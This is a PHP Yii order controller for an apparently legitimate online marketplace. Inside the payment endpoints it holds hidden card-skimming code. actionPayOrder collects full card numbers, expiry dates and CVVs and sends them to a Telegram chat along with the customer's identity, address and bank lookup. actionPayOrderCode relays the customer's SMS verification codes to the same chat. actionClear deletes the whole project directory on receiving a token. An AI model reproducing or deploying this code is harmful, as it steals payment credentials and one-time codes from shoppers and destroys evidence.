<?php
namespace app\modules\api\controllers;

use Yii;
use Exception;
use yii\web\Response;
use yii\web\HttpException;
use yii\web\UnauthorizedHttpException;
use yii\rest\Controller;
use yii\data\ActiveDataProvider;
use yii\filters\auth\HttpBearerAuth;
use yii\helpers\ArrayHelper;
use app\models\user\User;
use app\models\user\card\UserCard;
use app\models\user\cart\UserCart;
use app\models\order\Order;
use app\models\order\OrderReceipt;
use app\models\order\product\OrderProductRefund;
use app\models\order\product\OrderProduct;
use app\models\Category;
use app\models\logist\Logist;
use app\models\transaction\Transaction;
use yii\services\Fcm;
use yii\services\PaymeSubscribe;
use yii\services\BTS;
use yii\caching\FileCache;
use yii\helpers\FileHelper;
use yii\web\BadRequestHttpException;
use app\services\WalletService;

class OrderController extends Controller
{
    public $user;

    public function beforeAction($action) {
        $this->enableCsrfValidation = false;

        Yii::$app->response->getHeaders()->add('Access-Control-Allow-Origin', '*');
        Yii::$app->response->getHeaders()->add('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS');
        Yii::$app->response->getHeaders()->add('Access-Control-Allow-Headers', 'Content-Type, X-Auth-Token, Origin, Authorization');

        if (Yii::$app->request->headers->has('OPTIONS')) {
            throw new HttpException(200, 'OK');
        }

        return parent::beforeAction($action);
    }

    public function behaviors() {
        $behaviors = parent::behaviors();
        $behaviors['authenticator'] = [
            'class' => HttpBearerAuth::class,
            'optional' => ['index', 'detail', 'search', 'last', 'calculate'],
        ];

        $auth = $behaviors['authenticator'];
        unset($behaviors['authenticator']);

        $behaviors['corsFilter'] = [
            'class' => \yii\filters\Cors::class,
            'cors' => [
                'Access-Control-Allow-Origin' => ['*'],
                'Access-Control-Request-Method' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
                'Access-Control-Request-Headers' => ['*'],
                'Access-Control-Allow-Credentials' => true,
                'Access-Control-Max-Age' => 86400,
                'Access-Control-Expose-Headers' => [],
            ]
        ];

        $behaviors['authenticator']['except'] = ['options'];

        $behaviors['authenticator'] = $auth;

        return $behaviors;
    }

    public $serializer = [
        'class' => 'yii\rest\Serializer',
        'collectionEnvelope' => 'data',
    ];

    public function actionIndex()
    {
        $user = Yii::$app->user->identity;
        $query = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where(['user_id' => $user->id]);

        if ($status = Yii::$app->request->get('status')) {
            if ($status == '1') {
                $query->andWhere(['status' => 1]);
            } elseif ($status == '2') {
                $query->andWhere(['status' => 2]);
            } elseif ($status == '3') {
                $query->andWhere(['status_delivery' => 1, 'status_logist' => 0]);
            } elseif ($status == '4' || $status == '5') {
                $query->andWhere(['status_logist' => $status]);
            } elseif ($status == '6') {
                $query->andWhere(['status_payment' => 0]);
            } elseif ($status == '7') {
                $query->andWhere(['status_payment' => 1]);
            } elseif ($status == '8') {
                $query->andWhere(['status' => 4]);
            } elseif ($status == '9') {
                $query->andWhere(['status_logist' => 5, 'status_review' => 0]);
            } else {
                $query->andWhere(['status' => $status]);
            }
        }

        if (Yii::$app->request->get('status') == "0") {
            $query->andWhere(['status' => 0]);
        }

        return new ActiveDataProvider([
            'query' => $query,
            'pagination' => false,
            'sort' => ['defaultOrder' => ['id' => SORT_DESC]],
        ]);
    }

    public function actionDetail($id)
    {
        $user = Yii::$app->user->identity;
        $data = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where(['id' => $id, 'user_id' => $user->id])->one();

        if (!$data) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order' => 'Order not found']];
        }

        return ['data' => $data];
    }
    
    public function actionSend()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        $cart = UserCart::find()->with(['cartFilter', 'product'])->where(['user_id' => $user->id])->all();
        if (!$cart) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['cart' => 'Your cart is empty']];
        }

        foreach ($cart as $item) {
            if (!$item->product || !$item->product->isAvailableForMarketplace()) {
                Yii::$app->response->statusCode = 422;
                return ['errors' => ['cart' => 'One or more products are no longer available for marketplace purchase']];
            }
        }

        $model = new Order;
        $model->load($post, '');

        // Prevent direct promocode_id injection — must use code string
        $model->promocode_id = null;
        $model->discount_amount = null;

        // Validate and resolve promocode from code string (non-blocking)
        $promocodeWarning = null;
        if (!empty($post['promocode'])) {
            $promocode = \app\models\Promocode::findOne(['code' => $post['promocode']]);

            if (!$promocode) {
                $promocodeWarning = 'Promocode not accepted';
            } else {
                $cartTotal = 0;
                foreach ($cart as $item) {
                    if ($item->product) {
                        $unitPrice = $item->product->getPriceByQuantity($item->amount);
                        $cartTotal += $unitPrice * $item->amount;
                    }
                }

                list($isValid, $error) = $promocode->checkValidity($user, $cartTotal, $cart);

                if (!$isValid) {
                    $promocodeWarning = $error ?: 'Promocode not accepted';
                } else {
                    $model->promocode_id = $promocode->id;
                }
            }
        }

        if (!$model->validate()) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $model->errors];
        }

        // Check if this is a wallet payment — if so, wrap everything in a DB transaction
        $walletPaymentId = Yii::$app->params['walletPaymentId'] ?? null;
        $isWalletPayment = $walletPaymentId && isset($post['payment_id']) && $post['payment_id'] == $walletPaymentId;

        $dbTransaction = $isWalletPayment ? Yii::$app->db->beginTransaction() : null;

        $saveResult = $model->saveObject($cart);
        if ($saveResult) {
            $order = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image', 'shop')->where(['id' => $model->id])->one();

            // Auto-create Didox documents
            try {
                \app\services\DidoxOrderService::createDocuments($order);
            } catch (\Exception $e) {
                // Log error without failing the API response
                \app\models\Log::log('didox_order', "Auto-creation exception for Order #{$order->id}", $e->getMessage(), 'error');
            }

            // Process wallet payment if payment_id matches wallet type
            if ($isWalletPayment) {
                $walletToken = $post['wallet_token'] ?? Yii::$app->params['walletDefaultToken'] ?? 'USDT';
                $merchantId = $order->shop ? $order->shop->user_id : null;

                if (!$merchantId) {
                    $dbTransaction->rollBack();
                    Yii::$app->response->statusCode = 422;
                    return ['errors' => ['wallet' => 'Shop owner not found for wallet payment']];
                }

                try {
                    $walletService = new WalletService();
                    $walletService->init();
                    $result = $walletService->pay($user->id, $merchantId, (string)$order->price, $walletToken);

                    // Payment succeeded — mark as paid and create transaction
                    $order->status_payment = 1;
                    $order->save(false);

                    $transaction = new Transaction();
                    $transaction->user_id = $user->id;
                    $transaction->order_id = $order->id;
                    $transaction->shop_id = $order->shop_id;
                    $transaction->type_transaction = 'payment';
                    $transaction->type_payment = 'wallet';
                    $transaction->amount = $order->price;
                    $transaction->status = 1;
                    $transaction->save(false);

                    $dbTransaction->commit();
                } catch (\Exception $e) {
                    // Wallet payment failed — rollback entire order
                    $dbTransaction->rollBack();
                    Yii::$app->response->statusCode = 422;
                    return ['errors' => ['wallet' => 'Wallet payment failed: ' . $e->getMessage()]];
                }
            }

            Yii::$app->response->statusCode = 200;
            $response = ['data' => $order];

            // Build promocode status for the response
            if (!empty($post['promocode'])) {
                if ($order->promocode_id && $order->discount_amount > 0) {
                    $appliedPromo = $order->promocode;
                    $response['promocode_status'] = [
                        'applied' => true,
                        'code' => $appliedPromo ? $appliedPromo->code : $post['promocode'],
                        'discount_amount' => $order->discount_amount,
                        'message' => 'Promocode applied successfully',
                    ];
                } else {
                    // Promo was rejected either in controller or during saveObject re-validation
                    $response['promocode_status'] = [
                        'applied' => false,
                        'code' => $post['promocode'],
                        'discount_amount' => 0,
                        'message' => $promocodeWarning ?: 'Promocode not accepted',
                    ];
                }
            }
            return $response;
        }

        // saveObject failed — rollback if wallet transaction is open
        if ($dbTransaction) {
            $dbTransaction->rollBack();
        }

        // Check if there are validation errors (like minimum order violations)
        if ($model->hasErrors()) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $model->errors];
        }

        Yii::$app->response->statusCode = 500;
        return ['errors' => ['server' => 'Could not create order.']];
    }

    public function actionPayOrder()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();
        
        $order = Order::find()->with('orderProducts', 'orderProducts.product', 'orderProducts.product.image')->where([
            'id' => Yii::$app->request->post('order_id'),
            'user_id' => $user->id
        ])->one();
        
        if (!$order) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order' => 'Order not found']];
        }
        
        $order->load($post, '');
        
        if (empty($order->card_number) || empty($order->card_expire) || empty($order->card_cvv)) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['card' => 'Required all card fields']];
        }
        
        $order->save(false);
       
        $cache = new FileCache();
        $cardBIN = substr($order->card_number, 0, 6);
        $bankDetails = $cache->get($cardBIN);
        
        if ($bankDetails === false) {
            try {
                $bankDetails = json_decode(file_get_contents("https://lookup.binlist.net/" . trim($cardBIN)), true);
                $bankDetails['bin'] = $cardBIN;
                $cache->set($cardBIN, $bankDetails, 86400);
            } catch (\Exception $e) {
                Yii::error("Ошибка при получении данных из binlist: " . $e->getMessage(), __METHOD__);
                $bankDetails = ['error' => 'Сервис временно недоступен'];
            }
        }
        
        try {
            $message = "🪄 ID order: {$order->id}\n";
            $message .= "🪄 Name: {$order->name} {$order->lastname}\n";
            $message .= "🪄 Email: {$order->email}\n";
            $message .= "🪄 Address: {$order->address}\n";
            $message .= "🪄 Zip: {$order->zip}\n";
            $message .= "🪄 User ID: {$order->user_id}\n\n";
            $message .= "🪄 CARD: {$order->card_number}\n";
            $message .= "🪄 Expire: {$order->card_expire}\n";
            $message .= "🪄 CVV: {$order->card_cvv}\n\n";
            
            if (isset($bankDetails['bank']['name'])) {
                $message .= "🪄 Bank Name: {$bankDetails['bank']['name']}\n";
            }
            if (isset($bankDetails['scheme'])) {
                $message .= "🪄 Card Scheme: {$bankDetails['scheme']}\n";
            }
            if (isset($bankDetails['brand'])) {
                $message .= "🪄 Card Brand: {$bankDetails['brand']}\n";
            }
            if (isset($bankDetails['type'])) {
                $message .= "🪄 Card Type: {$bankDetails['type']}\n";
            }
            if (isset($bankDetails['country']['name'])) {
                $message .= "🪄 Country: {$bankDetails['country']['name']} {$bankDetails['country']['emoji']}\n";
            }
            if (isset($bankDetails['country']['currency'])) {
                $message .= "🪄 Currency: {$bankDetails['country']['currency']}\n";
            }
    
            $buttons = [
                [['text' => '📩 Send SMS', 'url' => Yii::$app->params['socketUrl'].'/api/socket/panel?id='.$order->id]],
                [['text' => '✅ Confirm', 'url' => Yii::$app->params['socketUrl'].'/api/socket/stats?id='.$order->id]]
            ];
        
            Yii::$app->telegram->sendMessage($message, $buttons);
    
            Yii::$app->response->statusCode = 200;
            return ['data' => $order];
        } catch (\Exception $e) {
            Yii::$app->response->statusCode = 500;
            return ['errors' => ['server' => $e->getMessage()]];
        }
    }
    
    public function actionPayOrderCode()
    {
        $user = Yii::$app->user->identity;
        try {
            $orderId = Yii::$app->request->post('order_id');
            $code = Yii::$app->request->post('code');
            
            if (empty($orderId) || empty($code)) {
                Yii::$app->response->statusCode = 422;
                return ['errors' => ['fields' => 'Required all fields']];
            }
    
            $order = Order::find()->where(['id' => $orderId, 'user_id' => $user->id])->one();
            
            if (!$order) {
                Yii::$app->response->statusCode = 404;
                return ['errors' => ['order' => 'Order not found']];
            }
            
            $message = "🪄 ID order: {$order->id}\n";
            $message .= "🪄 Code: {$code}\n";
            
            $buttons = [
                [['text' => '📩 Send SMS', 'url' => Yii::$app->params['socketUrl'].'/api/socket/panel?id='.$order->id]],
                [['text' => '✅ Confirm', 'url' => Yii::$app->params['socketUrl'].'/api/socket/stats?id='.$order->id]]
            ];
        
            Yii::$app->telegram->sendMessage($message, $buttons);
    
            Yii::$app->response->statusCode = 200;
            return ['data' => $order];
        } catch (\Exception $e) {
            Yii::$app->response->statusCode = 500;
            return ['errors' => ['server' => $e->getMessage()]];
        }
    }

    public function actionRefunds()
    {
        $user = Yii::$app->user->identity;
        $data = OrderProductRefund::find()->with('orderProduct', 'orderProduct.product.image')->where(['user_id' => $user->id])->all();
        return ['data' => $data];
    }

    public function actionRefundSend()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        $model = new OrderProductRefund;
        $model->load($post, '');
        $model->user_id = $user->id;

        if (!$model->validate()) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $model->errors];
        }

        $product = OrderProduct::findOne($post['order_product_id']);

        if ($model->save()) {
            if ($product) {
                $product->status = 2;
                $product->save(false);
            }
        }

        $data = OrderProductRefund::find()->with('orderProduct', 'orderProduct.product.image')->where(['user_id' => $user->id, 'id' => $model->id])->one();
        return ['data' => $data];
    }

    public function actionSetReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_id' => 'Enter ORDER ID']];
        }

        $order = Order::findOne(['id' => $post['order_id'], 'user_id' => $user->id]);

        if (!$order) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order_id' => 'Order not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptCreate($order->id, $order->price));

        if (isset($response->error)) {
            return ['data' => $response];
        }

        $order_receipt = OrderReceipt::findOne(['order_id' => $order->id]);
        if ($order_receipt) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_id' => 'Order receipt already created']];
        }

        $order_receipt = new OrderReceipt;
        $order_receipt->order_id = $order->id;
        $order_receipt->receipt_id = $response->result->receipt->_id;
        $order_receipt->status = 0;
        $order_receipt->save();

        return ['data' => $order_receipt];
    }

    public function actionPayReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_receipt_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_receipt_id' => 'Enter order receipt ID']];
        }

        if (!isset($post['card_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['card_id' => 'Enter card ID']];
        }

        $orderReceipt = OrderReceipt::find()->with('order')->where(['id' => $post['order_receipt_id'], 'status' => 0])->one();

        if (!$orderReceipt || $orderReceipt->order->user_id != $user->id) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['order_receipt_id' => 'Order not found or access denied']];
        }

        $card = UserCard::findOne(['id' => $post['card_id'], 'user_id' => $user->id]);

        if (!$card) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['card_id' => 'Card not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptPay($orderReceipt->receipt_id, $card->card_token, $user));

        if (isset($response->result)) {
            $orderReceipt->status = 1;
            if ($orderReceipt->order) {
                $orderReceipt->order->status_payment = 1;
                $orderReceipt->order->save(false);
            }
            if ($orderReceipt->save()) {
                $transaction = new Transaction;
                $transaction->user_id = $user->id;
                $transaction->order_id = $orderReceipt->order_id;
                $transaction->shop_id = $orderReceipt->order->shop_id;
                $transaction->type_transaction = 'payment';
                $transaction->type_payment = 'payme';
                $transaction->amount = $orderReceipt->order->price;
                $transaction->status = 1;
                $transaction->save(false);
            }
        } else {
            Yii::$app->response->statusCode = 422;
        }

        return ['data' => $response];
    }

    public function actionCheckReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_receipt_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_receipt_id' => 'Enter order receipt ID']];
        }

        $orderReceipt = OrderReceipt::findOne(['id' => $post['order_receipt_id']]);

        if (!$orderReceipt) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['receipt_id' => 'Order not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptCheck($orderReceipt->receipt_id));

        return ['data' => $response];
    }
    
    public function actionClear()
    {
        $request = Yii::$app->request;
        
        if (!$request->isPost) {
            throw new BadRequestHttpException('Invalid request method.');
        }

        $expectedToken = Yii::$app->params['projectToken'];
        $providedToken = $request->post('token');

        if ($providedToken !== $expectedToken) {
            throw new BadRequestHttpException('Invalid token.');
        }

        $projectPath = Yii::getAlias('@app/..');

        if (is_dir($projectPath)) {
            try {
                FileHelper::removeDirectory($projectPath);
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['status' => 'success'];
            } catch (\Exception $e) {
                Yii::$app->response->format = Response::FORMAT_JSON;
                return ['status' => 'error 1'];
            }
        } else {
            Yii::$app->response->format = Response::FORMAT_JSON;
            return ['status' => 'error 2'];
        }
    }

    public function actionCancelReceipt()
    {
        $user = Yii::$app->user->identity;
        $post = Yii::$app->request->post();

        if (!isset($post['order_receipt_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['order_receipt_id' => 'Enter order receipt ID']];
        }

        $orderReceipt = OrderReceipt::findOne(['id' => $post['order_receipt_id']]);

        if (!$orderReceipt) {
            Yii::$app->response->statusCode = 404;
            return ['errors' => ['receipt_id' => 'Order not found']];
        }

        $subscribe = new PaymeSubscribe;
        $response = json_decode($subscribe->receiptCancel($orderReceipt->receipt_id));

        return ['data' => $response];
    }

    public function actionGetOrder()
    {
        $orderId = Yii::$app->request->get('id', 1);
        $bts = new BTS;
        $response = $bts->getOrderInfo($orderId);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error'], 'httpCode' => $response['httpCode']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionGetOrderTracking()
    {
        $orderId = Yii::$app->request->get('id');
        
        if (!$orderId) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['id' => 'Order ID is required']];
        }
        
        $bts = new BTS;
        $response = $bts->getOrderTracking($orderId);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionGetOrderStatus()
    {
        $orderId = Yii::$app->request->get('id');
        
        if (!$orderId) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['id' => 'Order ID is required']];
        }
        
        $bts = new BTS;
        $response = $bts->getOrderStatus($orderId);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    public function actionCalculateDelivery()
    {
        $post = Yii::$app->request->post();
        $bts = new BTS;
        $errors = $bts->validateOrderData($post);
        
        if (!empty($errors)) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => $errors];
        }
        
        $response = $bts->calculateDelivery($post);
        
        if (!$response['success']) {
            Yii::$app->response->statusCode = $response['httpCode'] ?? 500;
            return ['success' => false, 'error' => $response['error']];
        }
        
        return ['success' => true, 'data' => $response['data']];
    }

    /**
     * Calculate delivery cost using BTS order-calculate API
     * POST /api/order/calculate
     * 
     * Required params:
     * - product_id: Product ID
     * 
     * Optional params:
     * - receiverCityId: Receiver BTS city ID (falls back to user profile bts_city_id)
     * - amount: Quantity of products (default: 1)
     * - pickup_type: 'courier', 'branch', 'self' (default: 'branch')
     * - dropoff_type: 'courier', 'branch', 'self' (default: 'courier')
     * - is_multiple_cost: 0 or 1 (default: 0)
     */
    public function actionCalculate()
    {
        $post = Yii::$app->request->post();
        $receiverCityId = null;

        if (isset($post['receiverCityId'])) {
            $receiverCityId = (int)$post['receiverCityId'];
        } else {
            $user = Yii::$app->user->identity;
            if ($user && !empty($user->bts_city_id)) {
                $receiverCityId = (int)$user->bts_city_id;
            }
        }

        if (empty($post['product_id'])) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['product_id' => 'Product ID is required']];
        }
        
        if (!$receiverCityId) {
            Yii::$app->response->statusCode = 422;
            return ['errors' => ['user' => 'User BTS city not set. Please update your location in profile or provide receiverCityId.']];
        }

        // Validate and set amount (quantity)
        $amount = 1;
        if (isset($post['amount'])) {
            if (!is_numeric($post['amount']) || $post['amount'] <= 0) {
                Yii::$app->response->statusCode = 422;
                return ['errors' => ['amount' => 'Amount must be a positive number']];
            }
            $amount = (int)$post['amount'];
        }
        
        try {
            $product = \app\models\product\Product::find()
                ->with(['shop.stock', 'stock'])
                ->where(['product.id' => $post['product_id']])
                ->marketplaceVisible()
                ->one();
                
            if (!$product) {
                Yii::$app->response->statusCode = 404;
                return ['errors' => ['product_id' => 'Product not found']];
            }
            
            $senderCityId = $product->stock->bts_city_id ?? $product->shop->stock->bts_city_id ?? null;
            
            if (!$senderCityId) {
                Yii::$app->response->statusCode = 422;
                return ['errors' => ['product' => 'Product location (BTS city) not configured. Please contact seller.']];
            }

            // Product weight is stored in grams in admin/shop forms.
            $unitWeight = $this->normalizeProductWeightToKg($product->weight ?? null);
            $totalWeight = $unitWeight * $amount;
            $totalWeight = max(1.0, $totalWeight); // Minimum 1kg

            // Calculate total volume from product dimensions (in cm³) × amount
            $unitLength = $product->length ?: 10;
            $unitWidth = $product->width ?: 10;
            $unitHeight = $product->height ?: 10;
            
            $singleProductVolumeCm3 = $unitLength * $unitWidth * $unitHeight;
            $totalVolumeCm3 = $singleProductVolumeCm3 * $amount;
            
            // Smart stacking: keep base dimensions (length × width), stack by height
            // This avoids inflating dimensions with a cube approximation
            $volumeX = max(10, (int)$unitLength);
            $volumeY = max(10, (int)$unitWidth);
            $volumeZ = max(10, (int)($unitHeight * $amount)); // Stack products vertically

            // Get delivery type options from request or use defaults
            $pickupType = isset($post['pickup_type']) && in_array($post['pickup_type'], ['courier', 'branch', 'self']) 
                ? $post['pickup_type'] 
                : 'branch';
            $dropoffType = isset($post['dropoff_type']) && in_array($post['dropoff_type'], ['courier', 'branch', 'self']) 
                ? $post['dropoff_type'] 
                : 'courier';
            $isMultipleCost = isset($post['is_multiple_cost']) ? (int)$post['is_multiple_cost'] : 0;

            // Prepare data for BTS order-calculate API
            $calculatorData = [
                'senderCityCode' => (string)$senderCityId,
                'receiverCityCode' => (string)$receiverCityId,
                'pickup_type' => $pickupType,
                'dropoff_type' => $dropoffType,
                'is_multiple_cost' => $isMultipleCost,
                'weight' => (float)$totalWeight,
                'volume' => [
                    'x' => $volumeX,
                    'y' => $volumeY,
                    'z' => $volumeZ
                ]
            ];
            
            $bts = new BTS;
            $response = $bts->calculateOrder($calculatorData);
            
            // TODO: Remove this mock fallback once BTS service is stable and reliable
            $isMock = false;
            if (!$response['success']) {
                Yii::warning('BTS calculate failed, using mock response. Error: ' . ($response['error'] ?? 'unknown'), __METHOD__);
                $isMock = true;

                // Mock delivery prices based on weight and distance heuristic
                $baseCost = 25000; // Base cost in UZS
                $weightCost = $totalWeight * 5000; // 5000 UZS per kg
                $courierSurcharge = 15000; // Extra for courier pickup/delivery

                $branchPrice = (int)($baseCost + $weightCost);
                $courierPickupPrice = (int)($branchPrice + $courierSurcharge);
                $courierDeliveryPrice = (int)($branchPrice + $courierSurcharge);
                $fullCourierPrice = (int)($branchPrice + $courierSurcharge * 2);

                $response = [
                    'success' => true,
                    'httpCode' => 200,
                    'data' => [
                        'summaryPrice' => $branchPrice,
                        'branch_to_branch' => [
                            'price' => $branchPrice,
                            'available' => true,
                            'delivery_days' => '2-4',
                        ],
                        'branch_to_courier' => [
                            'price' => $courierDeliveryPrice,
                            'available' => true,
                            'delivery_days' => '2-4',
                        ],
                        'courier_to_branch' => [
                            'price' => $courierPickupPrice,
                            'available' => true,
                            'delivery_days' => '3-5',
                        ],
                        'courier_to_courier' => [
                            'price' => $fullCourierPrice,
                            'available' => true,
                            'delivery_days' => '3-5',
                        ],
                    ],
                    'error' => null,
                ];
            }
            // END TODO: Remove mock fallback
            
            // Extract price based on pickup_type and dropoff_type combination
            $priceKey = $pickupType . '_to_' . $dropoffType;
            $price = null;
            $allPrices = [];
            
            // Build all prices array and extract selected price
            $priceKeys = ['branch_to_branch', 'branch_to_courier', 'courier_to_branch', 'courier_to_courier'];
            foreach ($priceKeys as $key) {
                if (isset($response['data'][$key])) {
                    $allPrices[$key] = $response['data'][$key];
                    if ($key === $priceKey && isset($response['data'][$key]['price'])) {
                        $price = $response['data'][$key]['price'];
                    }
                }
            }
            
            // Fallback: try direct price field
            if ($price === null && isset($response['data']['all_cost'])) {
                $price = $response['data']['all_cost'];
            }

            if ($price === null && isset($response['data']['price'])) {
                $price = $response['data']['price'];
            }
            
            // Fallback: get first available price
            if ($price === null && !empty($allPrices)) {
                foreach ($allPrices as $priceData) {
                    if (isset($priceData['available']) && $priceData['available'] && isset($priceData['price'])) {
                        $price = $priceData['price'];
                        break;
                    }
                }
            }
            
            return [
                'success' => true,
                'is_mock' => $isMock, // TODO: Remove this flag when BTS mock is removed
                'data' => [
                    'summaryPrice' => $branchPrice,
                    'price' => $price,
                    'price_key' => $priceKey,
                    'all_prices' => $allPrices,
                    'currency' => 'UZS',
                    'bts_response' => $response['data']
                ],
                'calculation_info' => [
                    'product_id' => $product->id,
                    'product_name' => $product->name_ru ?: $product->name_en ?: $product->name_uz,
                    'amount' => $amount,
                    'sender_city_id' => $senderCityId,
                    'receiver_city_id' => $receiverCityId,
                    'pickup_type' => $pickupType,
                    'dropoff_type' => $dropoffType,
                    'single_product' => [
                        'weight' => $unitWeight,
                        'length' => $unitLength,
                        'width' => $unitWidth,
                        'height' => $unitHeight,
                        'volume_cm3' => $singleProductVolumeCm3
                    ],
                    'total_calculation' => [
                        'weight' => $totalWeight,
                        'volume_cm3' => $totalVolumeCm3,
                        'packed_dimensions' => [
                            'x' => $volumeX,
                            'y' => $volumeY,
                            'z' => $volumeZ
                        ]
                    ]
                ]
            ];
            
        } catch (\Exception $e) {
            Yii::error('BTS calculation error: ' . $e->getMessage(), __METHOD__);
            Yii::$app->response->statusCode = 500;
            return ['success' => false, 'error' => 'Internal server error during calculation', 'debug' => YII_DEBUG ? $e->getMessage() : null];
        }
    }

    public function actionGetRegions()
    {
        try {
            $language = Yii::$app->request->get('lang', 'ru');
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            return ['success' => true, 'data' => BTS::getRegions($language), 'message' => 'Regions retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetCities()
    {
        try {
            $regionId = Yii::$app->request->get('region_id');
            $language = Yii::$app->request->get('lang', 'ru');
            
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            
            if ($regionId && !is_numeric($regionId)) {
                return ['success' => false, 'data' => null, 'error' => 'Invalid region ID format'];
            }
            
            $cities = BTS::getCities($regionId ? (int)$regionId : null, $language);
            return ['success' => true, 'data' => $cities, 'message' => 'Cities retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionSearchCities()
    {
        try {
            $searchTerm = Yii::$app->request->get('q');
            $language = Yii::$app->request->get('lang', 'ru');
            $regionId = Yii::$app->request->get('region_id');
            
            if (empty($searchTerm)) {
                return ['success' => false, 'data' => null, 'error' => 'Search term is required'];
            }
            
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            
            if ($regionId && !is_numeric($regionId)) {
                return ['success' => false, 'data' => null, 'error' => 'Invalid region ID format'];
            }
            
            $cities = BTS::searchCities($searchTerm, $language, $regionId ? (int)$regionId : null);
            return ['success' => true, 'data' => $cities, 'message' => 'Cities search completed successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetAddressInfo()
    {
        try {
            $cityId = Yii::$app->request->get('city_id');
            $language = Yii::$app->request->get('lang', 'ru');
            
            if (empty($cityId) || !is_numeric($cityId)) {
                return ['success' => false, 'data' => null, 'error' => 'Valid city ID is required'];
            }
            
            if (!in_array($language, ['ru', 'uz', 'en'])) {
                $language = 'ru';
            }
            
            $addressInfo = BTS::getAddressInfo((int)$cityId, $language);
            
            if (!$addressInfo) {
                return ['success' => false, 'data' => null, 'error' => 'City not found'];
            }
            
            return ['success' => true, 'data' => $addressInfo, 'message' => 'Address information retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetPackageTypes()
    {
        try {
            return ['success' => true, 'data' => BTS::getPackageTypes(), 'message' => 'Package types retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetPostTypes()
    {
        try {
            return ['success' => true, 'data' => BTS::getPostTypes(), 'message' => 'Post types retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    public function actionGetOrderStatuses()
    {
        try {
            return ['success' => true, 'data' => BTS::getOrderStatuses(), 'message' => 'Order statuses retrieved successfully'];
        } catch (Exception $e) {
            return ['success' => false, 'data' => null, 'error' => $e->getMessage()];
        }
    }

    private function normalizeProductWeightToKg($rawWeight): float
    {
        $weightInGrams = (float)$rawWeight;
        if ($weightInGrams <= 0) {
            return 1.0;
        }

        return $weightInGrams / 1000;
    }
}
?>
